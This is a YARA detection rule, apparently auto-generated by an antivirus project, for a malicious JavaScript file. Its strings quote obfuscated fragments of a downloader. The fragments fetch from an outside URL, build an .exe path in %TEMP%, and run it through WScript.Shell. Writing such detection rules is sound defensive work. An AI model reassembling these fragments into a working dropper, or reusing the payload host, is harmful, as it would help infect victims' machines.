rule sig_20160401_9386621f25c3ca14afd19f2f8145e942 {
  meta:
    description = "datamaliciousorder - file 20160401_9386621f25c3ca14afd19f2f8145e942.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ad01645549cb242c9aaa823c7290ce86229a3abbdf7c19f9e1843475a14e25f8"

  strings:
    $s1  = "PzuLfx[GqUbm](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "function LnuAri(VgeMd, NyCyt){LxLsj = LxLsj * 1; return VgeMd - NyCyt;};" fullword ascii
    $s3  = "var YhkPr = function FnCpw() {return WScript[BsjKbv](\"WScript\"+\".Shell\");}(), BdOj = 11;" fullword ascii
    $s4  = "if (PzuLfx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FrAxq(){return VsDi + \"\";};" fullword ascii
    $s6  = "function WngFge() {return YhkPr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XO9jqAq5hafAH.ex\" + \"e\";};" fullword ascii
    $s7  = "function EmRmp() {return ((DhvYus == true) && (DhvYus == KqZyd)) ? 1 : LxLsj;};" fullword ascii
    $s8  = "function ClPdl(MnwByv){YhkPr[\"R\"+\"un\"](MnwByv, LxLsj, LxLsj);};" fullword ascii
    $s9  = "var JtaQmp = new this[\"Date\"]();" fullword ascii
    $s10 = "function DxmLfc()" fullword ascii
    $s11 = "var DhvYus = false;" fullword ascii
    $s12 = "return LnuAri(LtjHpy, MwrLu);" fullword ascii
    $s13 = "DhvYus = true; " fullword ascii
    $s14 = "function EmdYd(){return BsjKbv;};" fullword ascii
    $s15 = "var ZoVs = false;" fullword ascii
    $s16 = "function BymKe(HdDhv) {var TykHqa = (1, 2, 3, 4, 5, HdDhv); return TykHqa;};" fullword ascii
    $s17 = "}while (LqeEb);" fullword ascii
    $s18 = "var KqZyd = false;" fullword ascii
    $s19 = "KqZyd = true; " fullword ascii
    $s20 = "function XajZs(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}